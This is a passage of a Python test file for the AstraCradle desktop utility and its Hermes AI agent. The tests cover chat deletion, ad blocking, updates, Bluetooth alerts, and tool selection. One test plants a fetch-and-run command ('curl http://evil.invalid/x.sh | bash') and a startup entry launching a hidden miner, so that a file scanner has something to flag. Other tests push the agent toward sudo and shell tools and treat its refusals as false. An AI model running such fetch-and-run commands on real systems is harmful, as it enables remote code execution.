        hm._append_session_message("sess_old", "assistant", "old answer")

        res = hm.delete_session("sess_old")
        assert res["ok"] is True
        assert res["deleted_messages"] == 2
        assert res["next_session_id"] == "sess_keep"
        assert hm.get_session_messages("sess_old") == []
        assert all(s["session_id"] != "sess_old" for s in hm.list_sessions())
        assert "Keep this memory forever." in hm.memory_path.read_text(encoding="utf-8")

        hp = (Path(__file__).resolve().parents[1] / "astracradle" / "ui" / "pages" / "hermes_page.py").read_text(encoding="utf-8")
        assert "Delete Chat" in hp and "_delete_session" in hp


def test_samsung_tv_ad_domains_blocked_and_essential_apps_allowed() -> None:
    import tempfile
    from pathlib import Path
    from astracradle.core.adblock_shield import AstraShieldManager
    from astracradle.core.config import ConfigManager
    from astracradle.core.journal import ForensicJournal
    from astracradle.core.rollback import RollbackManager

    with tempfile.TemporaryDirectory() as td:
        cm = ConfigManager(base_dir=Path(td))
        shield = AstraShieldManager(cm, RollbackManager(cm), ForensicJournal(cm))
        for ad_dom in ("ads.samsungads.com", "acr-us-prd.samsungcloud.tv", "samsungtvads.com", "log-config.samsungacr.com"):
            blocked, reason = shield.is_domain_blocked(ad_dom)
            assert blocked is True, f"Expected {ad_dom} to be blocked, got {reason}"
        for safe_dom in ("time.samsungcloudsolution.com", "lcprd1.samsungcloudsolution.net", "imasdk.googleapis.com", "r3---sn-test.googlevideo.com"):
            blocked, reason = shield.is_domain_blocked(safe_dom)
            assert blocked is False, f"Expected {safe_dom} to remain allowed, got {reason}"


def test_hermes_delete_all_chats_including_default_chaos(monkeypatch) -> None:
    import sys
    import tempfile
    import types
    from pathlib import Path
    from astracradle.core.config import AppConfig, ConfigManager
    from astracradle.core.hermes_agent import HermesAgentManager
    from astracradle.core.journal import ForensicJournal

    with tempfile.TemporaryDirectory() as td:
        cm = ConfigManager(base_dir=Path(td) / "astra")
        hm = HermesAgentManager(cm, ForensicJournal(cm))
        cfg = AppConfig()
        hm.ensure_hermes_home(cfg)

        # Populate multiple sessions including "default"
        hm._append_session_message("default", "user", "default msg 1")
        hm._append_session_message("sess_a", "user", "session a msg")
        hm._append_session_message("sess_b", "user", "session b msg")

        # Delete every session sequentially until DB is completely empty (including "default")
        for sid in ("sess_b", "sess_a", "default"):
            res = hm.delete_session(sid)
            assert res["ok"] is True
        assert hm.list_sessions() == []

        # Chaos: delete "default", empty string, whitespace, None repeatedly on empty DB
        for bad_sid in ("default", "", "   ", None):  # type: ignore[arg-type]
            res_empty = hm.delete_session(bad_sid)  # type: ignore[arg-type]
            assert res_empty["ok"] is True
            assert res_empty["remaining_count"] == 0
            assert res_empty["next_session_id"] == "default"
            assert hm.get_session_messages("default") == []

        # Headless UI simulation: click Delete Chat repeatedly when sessions are empty + non-empty
        class _FakeWidget:
            def __init__(self, *a, **kw):
                self._cmd = kw.get("command")
                self._text = kw.get("text", "")
                self._parent_canvas = self
                _created_widgets.append(self)

            def pack(self, *a, **kw):
                return self

            def grid(self, *a, **kw):
                return self

            def bind(self, *a, **kw):
                return None

            def after(self, ms, cb=None, *a):
                if callable(cb):
                    _after_queue.append(cb)
                return "after_id"

            def configure(self, *a, **kw):
                return None

            def winfo_children(self):
                return []

            def winfo_exists(self):
                return True

            def winfo_width(self):
                return 800

            def winfo_height(self):
                return 900

            def yview_moveto(self, *_a):
                return None

            def destroy(self):
                return None

            def insert(self, *a, **kw):
                return None

            def get(self, *a, **kw):
                return ""

            def focus_set(self):
                return None

            def grid_columnconfigure(self, *a, **kw):
                return None

            def add(self, name):
                return _FakeWidget()

            def set(self, name):
                return None

        _created_widgets: list[_FakeWidget] = []
        _after_queue: list[object] = []

        fake_ctk = types.SimpleNamespace(
            CTkFrame=_FakeWidget,
            CTkScrollableFrame=_FakeWidget,
            CTkLabel=_FakeWidget,
            CTkButton=_FakeWidget,
            CTkOptionMenu=_FakeWidget,
            CTkEntry=_FakeWidget,
            CTkSwitch=_FakeWidget,
            CTkCheckBox=_FakeWidget,
            CTkSlider=_FakeWidget,
            CTkTabview=_FakeWidget,
            CTkTextbox=_FakeWidget,
            ScalingTracker=types.SimpleNamespace(get_widget_scaling=lambda _w: 1.0),
        )
        fake_tk = types.SimpleNamespace(
            StringVar=lambda value="": types.SimpleNamespace(get=lambda: value, set=lambda _v: None),
            BooleanVar=lambda value=False: types.SimpleNamespace(get=lambda: value, set=lambda _v: None),
            messagebox=types.SimpleNamespace(askyesno=lambda *_a, **_kw: True),
        )
        import astracradle.ui.pages.hermes_page as hp_mod
        from astracradle.core.hermes_agent import recommend_hermes_models
        from astracradle.theme import get_ui_fonts, get_palette

        monkeypatch.setattr(hp_mod, "ctk", fake_ctk)
        monkeypatch.setattr(hp_mod, "tk", fake_tk)
        monkeypatch.setitem(sys.modules, "tkinter", fake_tk)

        hm._append_session_message("default", "user", "hello")
        toasts: list[str] = []
        fake_app = types.SimpleNamespace(
            hermes_scroll=_FakeWidget(),
            palette=get_palette("obsidian"),
            fonts=get_ui_fonts(1.0),
            config_obj=cfg,
            cfg_mgr=cm,
            hermes_mgr=hm,
            current_nav="hermes",
            _hermes_session_id="default",
            _hermes_fullscreen_chat=True,
            _hermes_rec_cache=recommend_hermes_models(),
            _hermes_status_cache=hm.get_status(cfg),
            _show_startup_popups=False,
            _content_wrap=lambda pad=0: 600,
            winfo_exists=lambda: True,
            winfo_height=lambda: 900,
            after=lambda ms, cb=None, *a: (_after_queue.append(cb) if callable(cb) else None),
            show_toast=lambda msg, **_kw: toasts.append(str(msg)),
        )
        hp_mod.render_hermes_page(fake_app)  # type: ignore[arg-type]
        del_btns = [w for w in _created_widgets if "Delete Chat" in str(getattr(w, "_text", ""))]
        assert del_btns and callable(del_btns[0]._cmd)
        # Click Delete Chat on non-empty "default", drain queued rerender, then click AGAIN on empty "default"
        del_btns[0]._cmd()
        assert hm.list_sessions() == []
        while _after_queue:
            cb = _after_queue.pop(0)
            if callable(cb):
                cb()
        del_btns_after = [w for w in _created_widgets if "Delete Chat" in str(getattr(w, "_text", ""))]
        assert del_btns_after
        del_btns_after[-1]._cmd()
        assert any("already empty" in t.lower() or "deleted chat" in t.lower() for t in toasts)


def test_update_preserves_live_user_settings_and_auto_restarts(monkeypatch) -> None:
    import subprocess
    import tempfile
    from pathlib import Path
    from astracradle.core.config import ConfigManager
    from astracradle.core.journal import ForensicJournal
    from astracradle.core.lifecycle import LifecycleManager
    from astracradle.core.rollback import RollbackManager
    from astracradle.core.updater import ModuleAndUpdateManager, UpdateCheckResult

    with tempfile.TemporaryDirectory() as td:
        root = Path(td)
        repo = root / "repo"
        (repo / ".git").mkdir(parents=True, exist_ok=True)
        (repo / "astracradle").mkdir(parents=True, exist_ok=True)

        cm = ConfigManager(base_dir=root / "astra")
        cfg = cm.load()
        cfg.setup_wizard_completed = True
        cfg.apply_module_selection(["core_diagnostics", "ai_hunter", "pro_tuning"], preset_name="Custom", sync_simple_mode=False)
        cfg.hermes_persona = "jedi_master"
        cfg.astrashield_lan_tv_mode = True
        cfg.github_check_interval_min = 45
        cm.save(cfg)

        j = ForensicJournal(cm)
        rb = RollbackManager(cm)
        lc = LifecycleManager(cm, rb, j)
        upd = ModuleAndUpdateManager(cm, j)

        # Simulate stale older install_memory.json with different modules/mode
        upd.save_install_memory(
            {
                "install_dir": str(repo),
                "install_method": "git_clone",
                "enabled_modules": ["core_diagnostics"],
                "install_bundle_preset": "Minimal",
                "setup_wizard_completed": True,
                "hermes_setup": {"hermes_mode": "local_gpu", "hermes_provider": "ollama", "hermes_model": "old-model"},
            }
        )

        monkeypatch.setattr(
            upd,
            "check_for_updates",
            lambda *_a, **_kw: UpdateCheckResult(
                current_version="2.5.1",
                latest_version="2.5.1 (9999aaa)",
                update_available=True,
                channel="stable",
                release_notes="https://github.com/jackbashroot-boop/AstraCradle/archive/9999aaa.zip",
                status_message="Newer GitHub push ready",
            ),
        )
        monkeypatch.setattr(
            "astracradle.core.updater.subprocess.run",
            lambda cmd, **_kw: subprocess.CompletedProcess(cmd, 0, stdout="ok", stderr=""),
        )
        monkeypatch.setattr(
            upd,
            "get_local_build_info",
            lambda **_kw: {"version": "2.5.1", "short_sha": "9999aaa", "display_version": "2.5.1 (9999aaa)"},
        )

        ok, _ = upd.pull_from_github_and_update(cfg, repo_dir=repo, run_pip=False)
        assert ok is True
        upd.reapply_remembered_setup(cfg, lc, repo_dir=repo)
        reloaded = cm.load()
        assert "ai_hunter" in reloaded.enabled_modules
        assert "pro_tuning" in reloaded.enabled_modules
        assert reloaded.hermes_persona == "jedi_master"
        assert reloaded.astrashield_lan_tv_mode is True
        assert reloaded.github_check_interval_min == 45

        app_src = (Path(__file__).resolve().parents[1] / "astracradle" / "ui" / "app.py").read_text(encoding="utf-8")
        assert "self.single_instance.release()" in app_src
        assert "self.after(350, self.restart_application)" in app_src
        assert "self.tray.stop()" in app_src and "os._exit(0)" in app_src
        assert "os.kill(old_pid, 0)" in app_src and "View Changelog" in app_src
        assert "CHANGELOG.md" in upd.get_changelog_url(cfg, repo_dir=repo)
        assert (Path(__file__).resolve().parents[1] / "BUG_REPORTS.txt").exists()
        assert (Path(__file__).resolve().parents[1] / "CHANGELOG.md").exists()


def test_bluetooth_battery_tracking_and_low_battery_important_alert(monkeypatch) -> None:
    import subprocess
    import tempfile
    from pathlib import Path
    from astracradle.core.config import ConfigManager
    from astracradle.core.journal import ForensicJournal
    from astracradle.core.lan_tv_shield import BluetoothDeviceInfo, LanTvAdShield

    with tempfile.TemporaryDirectory() as td:
        cm = ConfigManager(base_dir=Path(td))
        j = ForensicJournal(cm)
        tv = LanTvAdShield(j, state_dir=cm.base_dir)

        assert tv._parse_bt_battery_from_info("Battery Percentage: 0x55 (85)") == (85, "bluetoothctl")
        assert tv._parse_bt_battery_from_info("Battery Percentage: 17") == (17, "bluetoothctl")

        # Mock Linux bluetoothctl + upower scan
        monkeypatch.setattr("astracradle.core.lan_tv_shield.platform.system", lambda: "Linux")
        monkeypatch.setattr("astracradle.core.lan_tv_shield.shutil.which", lambda cmd: f"/usr/bin/{cmd}" if cmd in ("bluetoothctl", "upower") else None)

        def _fake_run(cmd, **_kw):
            if cmd[:2] == ["bluetoothctl", "devices"]:
                return subprocess.CompletedProcess(
                    cmd,
                    0,
                    stdout="Device AA:BB:CC:11:22:33 Sony WH-1000XM5\nDevice DD:EE:FF:44:55:66 DualSense Controller\n",
                    stderr="",
                )
            if cmd[:3] == ["bluetoothctl", "info", "AA:BB:CC:11:22:33"]:
                return subprocess.CompletedProcess(
                    cmd,
                    0,
                    stdout="Paired: yes\nConnected: yes\nTrusted: yes\nIcon: audio-headphones\nBattery Percentage: 0x55 (85)\n",
                    stderr="",
                )
            if cmd[:3] == ["bluetoothctl", "info", "DD:EE:FF:44:55:66"]:
                return subprocess.CompletedProcess(
                    cmd,
                    0,
                    stdout="Paired: yes\nConnected: yes\nIcon: input-gaming\n",
                    stderr="",
                )
            if cmd[:2] == ["upower", "-d"]:
                return subprocess.CompletedProcess(
                    cmd,
                    0,
                    stdout="Device: /org/freedesktop/UPower/devices/gaming_input_dd_ee_ff\n  native-path: dd:ee:ff:44:55:66\n  percentage: 15%\n",
                    stderr="",
                )
            return subprocess.CompletedProcess(cmd, 1, stdout="", stderr="")

        monkeypatch.setattr("astracradle.core.lan_tv_shield.subprocess.run", _fake_run)
        scanned = tv.scan_bluetooth_devices()
        by_mac = {d.mac: d for d in scanned}
        assert by_mac["AA:BB:CC:11:22:33"].battery_pct == 85
        assert by_mac["DD:EE:FF:44:55:66"].battery_pct == 15

        # 1. First scan below 20% -> triggers newly_low_devices alert
        rep1 = tv.scan_and_track_bluetooth_batteries(low_threshold_pct=20, devices_override=scanned)
        assert len(rep1["low_battery_devices"]) == 1
        assert len(rep1["newly_low_devices"]) == 1
        alert_txt = tv.format_low_battery_alert(rep1["newly_low_devices"], 20)
        assert "DualSense Controller" in alert_txt and "15%" in alert_txt and "<20%" in alert_txt

        # 2. Still below 20% on next poll -> stays tracked as low, does not spam newly_low_devices
        still_low = [
            BluetoothDeviceInfo(mac="AA:BB:CC:11:22:33", name="Sony WH-1000XM5", device_kind="audio", paired=True, connected=True, battery_pct=82),
            BluetoothDeviceInfo(mac="DD:EE:FF:44:55:66", name="DualSense Controller", device_kind="input", paired=True, connected=True, battery_pct=14),
        ]
        rep2 = tv.scan_and_track_bluetooth_batteries(low_threshold_pct=20, devices_override=still_low)
        assert len(rep2["low_battery_devices"]) == 1
        assert rep2["newly_low_devices"] == []

        # 3. Recharged >= 25% -> clears low_alerted, then dropping below 20% again alerts anew
        recharged = [
            BluetoothDeviceInfo(mac="DD:EE:FF:44:55:66", name="DualSense Controller", device_kind="input", paired=True, connected=True, battery_pct=65),
        ]
        rep3 = tv.scan_and_track_bluetooth_batteries(low_threshold_pct=20, devices_override=recharged)
        assert rep3["low_battery_devices"] == []
        dropped_again = [
            BluetoothDeviceInfo(mac="DD:EE:FF:44:55:66", name="DualSense Controller", device_kind="input", paired=True, connected=True, battery_pct=18),
        ]
        rep4 = tv.scan_and_track_bluetooth_batteries(low_threshold_pct=20, devices_override=dropped_again)
        assert len(rep4["newly_low_devices"]) == 1

        # Persisted tracked list remembers devices even if temporarily disconnected
        tracked = tv.get_tracked_bluetooth_devices()
        assert len(tracked) == 2
        assert any(t["mac"] == "AA:BB:CC:11:22:33" and t["battery_pct"] == 82 for t in tracked)

        app_src = (Path(__file__).resolve().parents[1] / "astracradle" / "ui" / "app.py").read_text(encoding="utf-8")
        assert "bt_battery_update" in app_src
        assert "important=True" in app_src and "Bluetooth Battery Alerts (<20%)" in app_src


def test_hermes_live_working_indicator_persists_across_menu_switch(monkeypatch) -> None:
    import sys
    import tempfile
    import threading
    import time
    import types
    from pathlib import Path
    from astracradle.core.config import AppConfig, ConfigManager
    from astracradle.core.hermes_agent import HermesAgentManager, recommend_hermes_models
    from astracradle.core.journal import ForensicJournal
    from astracradle.theme import get_palette, get_ui_fonts
    import astracradle.ui.pages.hermes_page as hp_mod

    with tempfile.TemporaryDirectory() as td:
        cm = ConfigManager(base_dir=Path(td) / "astra")
        hm = HermesAgentManager(cm, ForensicJournal(cm))
        cfg = AppConfig()
        hm.ensure_hermes_home(cfg)
        hm._append_session_message("default", "user", "Full PC scan request")

        texts_configured: list[str] = []
        after_callbacks: list[object] = []

        class _FakeWidget:
            def __init__(self, *a, **kw):
                self._text = kw.get("text", "")
                self._parent_canvas = self
                self._packed = False

            def pack(self, *a, **kw):
                self._packed = True
                return self

            def pack_forget(self):
                self._packed = False

            def grid(self, *a, **kw):
                return self

            def bind(self, *a, **kw):
                return None

            def after(self, ms, cb=None, *a):
                if callable(cb):
                    after_callbacks.append(cb)
                return "aid"

            def configure(self, *a, **kw):
                if "text" in kw:
                    self._text = str(kw["text"])
                    texts_configured.append(self._text)

            def winfo_children(self):
                return []

            def winfo_exists(self):
                return True

            def winfo_manager(self):
                return "pack" if self._packed else ""

            def winfo_width(self):
                return 800

            def winfo_height(self):
                return 900

            def yview_moveto(self, *_a):
                return None

            def destroy(self):
                return None

            def insert(self, *a, **kw):
                return None

            def get(self, *a, **kw):
                return ""

            def focus_set(self):
                return None

            def grid_columnconfigure(self, *a, **kw):
                return None

            def add(self, name):
                return _FakeWidget()

            def set(self, name):
                return None

        fake_ctk = types.SimpleNamespace(
            CTkFrame=_FakeWidget,
            CTkScrollableFrame=_FakeWidget,
            CTkLabel=_FakeWidget,
            CTkButton=_FakeWidget,
            CTkOptionMenu=_FakeWidget,
            CTkEntry=_FakeWidget,
            CTkSwitch=_FakeWidget,
            CTkCheckBox=_FakeWidget,
            CTkSlider=_FakeWidget,
            CTkTabview=_FakeWidget,
            CTkTextbox=_FakeWidget,
            ScalingTracker=types.SimpleNamespace(get_widget_scaling=lambda _w: 1.0),
        )
        fake_tk = types.SimpleNamespace(
            StringVar=lambda value="": types.SimpleNamespace(get=lambda: value, set=lambda _v: None),
            BooleanVar=lambda value=False: types.SimpleNamespace(get=lambda: value, set=lambda _v: None),
            messagebox=types.SimpleNamespace(askyesno=lambda *_a, **_kw: True),
        )
        monkeypatch.setattr(hp_mod, "ctk", fake_ctk)
        monkeypatch.setattr(hp_mod, "tk", fake_tk)
        monkeypatch.setitem(sys.modules, "tkinter", fake_tk)

        ev = threading.Event()
        fake_app = types.SimpleNamespace(
            hermes_scroll=_FakeWidget(),
            palette=get_palette("obsidian"),
            fonts=get_ui_fonts(1.0),
            config_obj=cfg,
            cfg_mgr=cm,
            hermes_mgr=hm,
            current_nav="hermes",
            _hermes_session_id="default",
            _hermes_fullscreen_chat=True,
            _hermes_rec_cache=recommend_hermes_models(),
            _hermes_status_cache=hm.get_status(cfg),
            _hermes_cancel_event=ev,
            _hermes_live_session_id="default",
            _hermes_live_thinking="Steps: scanning drives & files",
            _hermes_live_started_at=time.monotonic() - 5.0,
            _show_startup_popups=False,
            _content_wrap=lambda pad=0: 600,
            winfo_exists=lambda: True,
            winfo_height=lambda: 900,
            after=lambda ms, cb=None, *a: (after_callbacks.append(cb) if callable(cb) else None),
            show_toast=lambda *_a, **_kw: None,
        )
        # Re-render as if returning from another AstraCradle menu while Hermes is still working
        hp_mod.render_hermes_page(fake_app)  # type: ignore[arg-type]
        assert any("is working.." in t or "Working.." in t or "is working." in t for t in texts_configured)
        assert callable(getattr(fake_app, "_hermes_chat_reloader", None))

        # Trigger another tick -> cycles dots cleanly and keeps streaming via _hermes_chat_reloader
        next_ticks = [cb for cb in after_callbacks if callable(cb)]
        assert next_ticks
        for cb in next_ticks[:3]:
            cb()
        fake_app._hermes_chat_reloader(thinking="Steps: checking drives done -> analyzing", use_cache=True)
        assert any("Working" in t for t in texts_configured)

        # Also assert re-entrancy guard prevents duplicate GitHub update prompts
        from astracradle.ui.app import AstraCradleApp
        fake_upd_app = types.SimpleNamespace(
            _show_startup_popups=True,
            config_obj=cfg,
            _github_check_in_flight=False,
            _github_prompt_open=True,
            _github_update_in_progress=False,
            _last_github_check_ts=0.0,
            _prompted_github_version="",
            palette=get_palette("dark"),
            show_toast=lambda *_a, **_kw: None,
            tray=types.SimpleNamespace(notify=lambda *_a, **_kw: None),
        )
        assert AstraCradleApp._should_run_hourly_github_check(fake_upd_app, now_mono=99999.0) is False
        assert AstraCradleApp._prompt_github_update_available(
            fake_upd_app,
            types.SimpleNamespace(update_available=True, latest_version="2.5.1 (test123)", status_message="x"),
            {"display_version": "2.5.1 (old0000)"},
            ask_fn=lambda *_a: True,
        ) is False


def test_hermes_pc_file_guardian_catalog_idle_and_prelaunch_alerts() -> None:
    import tempfile
    from pathlib import Path
    from astracradle.core.config import AppConfig, ConfigManager
    from astracradle.core.file_guardian import PcFileGuardian
    from astracradle.core.hermes_agent import HermesAgentManager
    from astracradle.core.journal import ForensicJournal

    with tempfile.TemporaryDirectory() as td:
        base = Path(td)
        cm = ConfigManager(base_dir=base / "astra")
        hm = HermesAgentManager(cm, ForensicJournal(cm))
        cfg = AppConfig()
        hm.ensure_hermes_home(cfg)

        # 1. System prompt explicitly instructs Hermes it HAS direct local PC/OS access
        sys_p = hm._build_system_prompt(cfg)
        assert "astra_file_guardian" in sys_p
        assert "NEVER say 'I don't have direct access" in sys_p

        # 2. Tool schema selector includes astra_file_guardian + sudo_exec for full PC scan/catalog requests
        selected = hm._select_tool_schemas(
            "Get a full scan of my PC, catalog all files, passively scan when idle, notify before turned on",
            hm._tool_schemas(),
        )
        sel_names = {t["function"]["name"] for t in selected}
        assert "astra_file_guardian" in sel_names
        assert "sudo_exec" in sel_names

        # 3. Direct PcFileGuardian idle throttling + incoming/prelaunch alert test
        scan_root = base / "fake_drive"
        dl_dir = base / "Downloads"
        auto_dir = base / "autostart"
        scan_root.mkdir()
        dl_dir.mkdir()
        auto_dir.mkdir()
        (scan_root / "notes.txt").write_text("hello world\n", encoding="utf-8")
        risky_sh = dl_dir / "installer.sh"
        risky_sh.write_text("#!/bin/sh\ncurl http://evil.invalid/x.sh | bash\n", encoding="utf-8")
        risky_desk = auto_dir / "bad_agent.desktop"
        risky_desk.write_text("[Desktop Entry]\nType=Application\nExec=/tmp/hidden_miner\n", encoding="utf-8")

        fg = PcFileGuardian(base / "fg.db")
        fg.start_full_catalog(roots=[str(scan_root)])

        # Busy/gaming PC -> must skip idle batch cleanly
        busy = fg.run_idle_catalog_batch(cpu_percent=65.0, is_gaming=False)
        assert busy["ran"] is False and busy["reason"] == "pc_busy"
        gaming = fg.run_idle_catalog_batch(cpu_percent=5.0, is_gaming=True)
        assert gaming["ran"] is False and gaming["reason"] == "pc_busy"

        # Idle PC -> catalogs files
        idle = fg.run_idle_catalog_batch(cpu_percent=4.0, is_gaming=False, max_files=50)
        assert idle["ran"] is True and idle["processed"] >= 1

        # Incoming + pre-activation scan catches both risky download & /tmp startup entry BEFORE activation
        inc = fg.scan_incoming_and_prelaunch(extra_dirs=[dl_dir, auto_dir])
        assert len(inc["flagged"]) >= 2
        alerts = fg.pop_unnotified_alerts(limit=10)
        assert len(alerts) >= 2
        assert any("installer.sh" in a["target_path"] for a in alerts)
        assert any("bad_agent.desktop" in a["target_path"] for a in alerts)

        # 4. Hermes execute_tool("astra_file_guardian", ...) persists config flag & stores baseline
        res = hm.execute_tool("astra_file_guardian", {"action": "start_full_catalog_and_guard", "max_files": 50}, cfg)
        assert res["ok"] is True
        assert cfg.file_guardian_catalog_enabled is True


def test_hermes_retry_inherits_intent_and_prevents_false_refusal() -> None:
    import tempfile
    from pathlib import Path
    from astracradle.core.config import AppConfig, ConfigManager
    from astracradle.core.hermes_agent import HermesAgentManager
    from astracradle.core.journal import ForensicJournal

    with tempfile.TemporaryDirectory() as td:
        cm = ConfigManager(base_dir=Path(td) / "astra")
        hm = HermesAgentManager(cm, ForensicJournal(cm))
        cfg = AppConfig()
        hm.ensure_hermes_home(cfg)

        hist = [
            {"role": "user", "content": "Get a full scan of my PC, catalog all files and drives, notify before turned on"},
            {"role": "assistant", "content": "I can't perform a full scan..."},
            {"role": "user", "content": "Try again"},
        ]
        eff = hm._effective_action_prompt("Try again", hist)
        assert "catalog all files" in eff.lower()
        assert hm._prompt_needs_tools(eff) is True
        assert hm._looks_like_false_refusal("I can't directly check your Wi-Fi channels because I don't have access to your hardware.") is True

        fallback = hm._format_tool_results_fallback([
            ("astra_wifi_check", {"ok": True, "interface": "wlan0", "channel": 36, "signal_dbm": -54}),
            ("astra_file_guardian", {"ok": True, "files_cataloged": 420}),
        ])
        assert "astra_wifi_check [OK]" in fallback and "channel=36" in fallback
        assert "astra_file_guardian [OK]" in fallback and "files_cataloged=420" in fallback


def test_hermes_on_the_fly_shell_and_rule_adaptation(monkeypatch) -> None:
    import shutil
    import subprocess
    import tempfile
    from pathlib import Path
    from astracradle.core.config import AppConfig, ConfigManager
    from astracradle.core.hermes_agent import HermesAgentManager
    from astracradle.core.journal import ForensicJournal

    with tempfile.TemporaryDirectory() as td:
        cm = ConfigManager(base_dir=Path(td) / "astra")
        hm = HermesAgentManager(cm, ForensicJournal(cm))
        cfg = AppConfig(hermes_permission_level="standard_user")
        hm.ensure_hermes_home(cfg)

        orig_which = shutil.which
        monkeypatch.setattr(shutil, "which", lambda name: "/usr/bin/fish" if name == "fish" else orig_which(name))

        # 1. Tool selector & _prompt_needs_tools recognize Fish & standing-rule requests
        p_txt = "Also from now on you need to use Fish instead of bash for all commands."
        assert hm._prompt_needs_tools(p_txt) is True
        sel_names = {t["function"]["name"] for t in hm._select_tool_schemas(p_txt, hm._tool_schemas())}
        assert "astra_adapt_preferences" in sel_names
        assert hm._looks_like_false_refusal("I cannot switch to Fish shell as it is not supported in the current environment.") is True

        # 2. Switch preferred shell to Fish on the fly -> updates config, USER.md, and _build_system_prompt
        sw = hm.execute_tool("astra_adapt_preferences", {"action": "set_shell", "shell": "fish"}, cfg)
        assert sw["ok"] is True
        assert sw["preferred_shell"] == "fish"
        assert cfg.hermes_preferred_shell == "fish"
        sh_name, sh_prefix = hm._resolve_command_shell(cfg)
        assert sh_name == "fish" and sh_prefix == ["/usr/bin/fish", "-c"]
        assert "ActiveCommandShell=fish" in hm._build_system_prompt(cfg)

        # 3. Verify shell_exec actually passes commands through ["/usr/bin/fish", "-c", ...]
        seen_argv: list[object] = []

        def _fake_run(argv, **kw):
            seen_argv.append(argv)
            return subprocess.CompletedProcess(argv, 0, stdout="fish ok\n", stderr="")

        monkeypatch.setattr(subprocess, "run", _fake_run)
        sh_res = hm.execute_tool("shell_exec", {"command": "ls -la"}, cfg)
        assert sh_res["ok"] is True and sh_res["shell"] == "fish"
        assert seen_argv == [["/usr/bin/fish", "-c", "ls -la"]]

        # 4. Standing rule adapts immediately into USER.md & MEMORY.md
        r_res = hm.execute_tool("astra_adapt_preferences", {"action": "add_standing_rule", "rule": "Always prefer Fish syntax"}, cfg)
        assert r_res["ok"] is True
        assert "Always prefer Fish syntax" in hm.user_md_path.read_text(encoding="utf-8")


def test_all_quick_actions_dropdown_and_tool_grounding_no_hallucinations(monkeypatch) -> None:
    import tempfile
    import types
    from pathlib import Path
    from astracradle.core.config import AppConfig, ConfigManager
    from astracradle.core.hermes_agent import HermesAgentManager
    from astracradle.core.journal import ForensicJournal
    from astracradle.theme import get_palette, get_ui_fonts
    import astracradle.ui.pages.hermes_page as hp_mod

    with tempfile.TemporaryDirectory() as td:
        cm = ConfigManager(base_dir=Path(td) / "astra")
        hm = HermesAgentManager(cm, ForensicJournal(cm))
        cfg = AppConfig(hermes_permission_level="standard_user")
        hm.ensure_hermes_home(cfg)

        # 1. Verify all 15 dropdown items require tools, have no leaked internal syntax, and pass tool schema selection
        all_tools = hm._tool_schemas()
        assert len(hp_mod._QUICK_ACTION_CHIPS) >= 15
        for lbl, q_txt in hp_mod._QUICK_ACTION_CHIPS:
            assert "astra_" not in q_txt, f"Internal tool name leaked in '{lbl}': {q_txt}"
            assert hm._prompt_needs_tools(q_txt) is True, f"_prompt_needs_tools failed for '{lbl}'"
            selected = hm._select_tool_schemas(q_txt, all_tools)
            assert len(selected) >= 6, f"Too few tools selected for '{lbl}'"

        # 2. Run EVERY underlying tool used by the 15 quick actions and assert ok=True with zero crashes/fake errors
        tool_calls_to_verify = [
            ("astra_deep_scan", {}),
            ("astra_system_status", {}),
            ("astra_thermals_and_fans", {"action": "inspect"}),
            ("astra_fix_safe", {"dry_run": True}),
            ("astra_probalance_and_profile", {"action": "status"}),
            ("astra_process_lookup", {"query": ""}),
            ("astra_wifi_check", {}),
            ("astra_wifi_optimize", {"apply": False}),
            ("astra_startup_audit", {}),
            ("astra_file_guardian", {"action": "start_full_catalog_and_guard", "max_files": 40}),
            ("astra_lan_and_sinkhole", {"action": "sinkhole_status"}),
            ("astra_av_and_peripherals", {"action": "inspect"}),
            ("astra_services_and_storage", {}),
            ("astra_system_updates", {"action": "check"}),
            ("astra_journal_and_crashes", {"limit": 10}),
            ("astra_remote_tasks", {"action": "status"}),
            ("astra_self_heal_repair", {}),
            ("astra_rollback_undo", {"action": "list"}),
            ("astra_pc_usage_summary", {}),
            ("astra_dev_self_build", {"action": "inspect"}),
            ("astra_verify_work", {"action": "audit_draft", "draft_text": "All clear."}),
        ]
        for tname, targs in tool_calls_to_verify:
            res = hm.execute_tool(tname, targs, cfg)
            assert res.get("ok") is True, f"Tool {tname} failed: {res}"
        # Ensure astra_process_lookup(query="") returned real top_processes and astra_av_and_peripherals has bluetooth_devices
        procs_res = hm.execute_tool("astra_process_lookup", {"query": ""}, cfg)
        assert isinstance(procs_res.get("top_processes"), list) and len(procs_res["top_processes"]) >= 1
        av_res = hm.execute_tool("astra_av_and_peripherals", {"action": "inspect"}, cfg)
        assert "bluetooth_devices" in av_res

        # 3. Verify _build_quick_chips renders a dropdown menu (CTkOptionMenu) instead of a grid of buttons
        created_menus: list[object] = []
        created_btns: list[str] = []
        sent_prompts: list[str] = []

        class _FakeW:
            def __init__(self, *a, kind="btn", **kw):
                self._kw = kw
                if kind == "menu":
                    created_menus.append(self)
                elif kind == "btn" and "text" in kw:
                    created_btns.append(str(kw["text"]))

            def pack(self, *a, **kw):
                return self

        monkeypatch.setattr(
            hp_mod,
            "ctk",
            types.SimpleNamespace(
                CTkLabel=lambda *a, **kw: _FakeW(*a, kind="lbl", **kw),
                CTkOptionMenu=lambda *a, **kw: _FakeW(*a, kind="menu", **kw),
                CTkButton=lambda *a, **kw: _FakeW(*a, kind="btn", **kw),
            ),
        )
        monkeypatch.setattr(
            hp_mod,
            "tk",
            types.SimpleNamespace(StringVar=lambda value="": types.SimpleNamespace(get=lambda: value, set=lambda _v: None)),
        )
        hp_mod._build_quick_chips(_FakeW(), sent_prompts.append, get_palette("dark"), get_ui_fonts(1.0))
        assert len(created_menus) == 1
        assert created_btns == ["▶ Run"]
        menu_vals = created_menus[0]._kw["values"]
        for lbl, _ in hp_mod._QUICK_ACTION_CHIPS:
            assert lbl in menu_vals
        # Picking an item from dropdown triggers send_cb with its prompt
        created_menus[0]._kw["command"](hp_mod._QUICK_ACTION_CHIPS[4][0])
        assert sent_prompts == [hp_mod._QUICK_ACTION_CHIPS[4][1]]


def test_stephen_ai_rename_and_bluetooth_peripherals_page(monkeypatch) -> None:
    import types
    from pathlib import Path
    from astracradle.core.config import AppConfig
    from astracradle.core.hermes_agent import HERMES_PERSONAS
    from astracradle.core.lan_tv_shield import BluetoothDeviceInfo
    from astracradle.core.usb_guard import PeripheralDevice
    from astracradle.theme import get_palette, get_ui_fonts
    import astracradle.ui.pages.peripherals_page as pp_mod

    # 1. Default persona & UI labels reflect Stephen AI
    assert HERMES_PERSONAS["astra_standard"]["name"] == "Stephen"
    assert "Stephen AI" in HERMES_PERSONAS["astra_standard"]["badge"]
    app_src = (Path(__file__).resolve().parents[1] / "astracradle" / "ui" / "app.py").read_text(encoding="utf-8")
